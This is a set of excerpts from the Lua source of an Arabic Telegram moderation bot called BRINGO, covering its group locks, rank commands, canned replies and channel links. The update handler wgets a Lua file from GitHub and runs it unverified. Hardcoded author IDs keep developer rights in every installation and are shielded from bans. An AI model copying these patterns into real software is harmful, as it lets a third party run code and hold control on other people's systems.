...
sudo_users = {SUDO,1841250371,1654178416,1794141514}   
...
var = true  
elseif tonumber(user_id) == tonumber(1794141514) then
var = true  
...
os.execute('wget https://raw.githubusercontent.com/exBRINGO200/EX/main/BRINGO.lua')
send(msg.chat_id_, msg.id_,' ☁️ تم تحديث السور س \n ☁️ لديك اخر اصدار لسورس برينجو \n ☁️ الاصدار☁️ { v 7.0}')
dofile('BRINGO.lua')  
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ☁️ اصدار سورس برينجو\n ☁️ الاصدار☁️{ v 7.0}')
end
...
send(msg.chat_id_, msg.id_,'☁️  عدد الجروبات الان ☁️ { '..#group..' }'..BRINGOk..''..BRINGO..'\n☁️  الان عدد الجروبات الحقيقي ☁️ { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ☁️ العضو ☁️ ['..result.title_..'](t.me/'..(username or 'BringoX')..')'
status  = '\n ☁️ تم ترقيته مطور'
...
usertext = '\n ☁️ العضو ☁️ ['..data.first_name_..'](t.me/'..(data.username_ or 'BringoX')..')'
status  = '\n ☁️ تم ترقيته مطور'
...
if BRINGO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☁️ العضو ☁️ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BringoX')..') \n ☁️ '..BRINGO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ☁️ العضو : {["..data.first_name_.."](T.ME/BringoX)}\n ☁️ ["..BRINGO_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☁️ عذرا ☁️ {["..data.first_name_.."](T.ME/BringoX)}\n ☁️ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."BRINGO:blocname"..msg.chat_id_) or ""
...
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."BRINGO:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."BRINGO:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."BRINGO:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."BRINGO:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
send(msg.chat_id_, msg.id_, "☁️ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "BringoX")..")\n☁️ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."BRINGO:teh"..msg.chat_id_).."} بجانب اسمك\n☁️ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ☁️  ᏴᎡᎥΝᏀΌ  ☁️ ',url="t.me/BringoXx"}},
{{text = '☁️  ᎷᎪᎡͲᎬΝ  ☁️',url="t.me/UU_bh"}},
{{text = '☁️  ᏦᎪᎡᎬᎪᎷ ☁️', url="t.me/DV_AL7"}},
{{text = '☁️ 𝑺𝑶𝑼𝑹𝑪𝑬 ᏴᎡᎥΝᏀΌ  ☁️', url="t.me/BringoX"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '☁️ BRINGO ☁️',url="t.me/BringoXx"}},
{{text = '⌯｟TＷＡＳＯＬ｠⌯',url="t.me/TWLANGBOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'اليكس' or text == 'BRINGO' or text == 'BRINGO' then
local Text = [[
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '☁️ SＯＵＲＣＥ ☁️', url="t.me/BringoX"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☁️ بواسطه ☁️ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BringoX')..') \n ☁️ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☁️ بواسطه ☁️ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BringoX')..') \n ☁️ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1794141514) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1794141514) then
send(msg.chat_id_, msg.id_, " ☁️ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1794141514) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if Get_info then
local TextS = "\n ☁️ اهلا بك في متجر ملفات برينجو\n ☁️ ملفات السورس ↓\n⩹━━━━━━ ᏴᎡᎥΝᏀΌ ━━━━━━⩺\n\n"
local TextE = "\n⩹━━━━━━ ᏴᎡᎥΝᏀΌ ━━━━━━⩺\n ☁️ علامة تعني { ✔️ } ملف مفعل\n ☁️ علامة تعني { ✖ } ملف معطل\n ☁️ قناة سورس برينجو↓\n".." ☁️ [اضغط هنا لدخول](t.me/BringoX) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ☁️ عذرا الملف لايدعم سورس برينجو\n") 
end
return false
end
...
if #list == 0 then
t = " ☁️ لا يوجد احد في قائمه برينجو"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☁️ لعضو ☁️ ['..data.first_name_..'](t.me/'..(data.username_ or 'BringoX')..')'
status  = '\n ☁️ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☁️ العضو ☁️ '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☁️ العضــو ☁️ ['..data.first_name_..'](t.me/'..(data.username_ or 'BringoX')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☁️ العضو ☁️ ['..result.title_..'](t.me/'..(text1[3] or 'BringoX')..')'..'\n ☁️ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/BringoX)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/BringoX)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/BringoX)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/BringoX)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي ❤️](t.me/BringoX)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/BringoX)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/BringoX)')
return false
end
end
end
...
اتبع الازرار تحت ⇣
واستمتع للأوامر 🕹️
[☁️ 𝒔𝒐𝒖𝒓𝒄𝒆 ᏴᎡᎥΝᏀΌ ☁️](t.me/BringoX)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = ' 𝒔𝒐𝒖𝒓𝒄𝒆 ᏴᎡᎥΝᏀΌ', url="t.me/BringoX"},
...
if BRINGO1_Msg then    
send(msg.chat_id_, msg.id_," ☁️ "..BRINGO1_Msg)
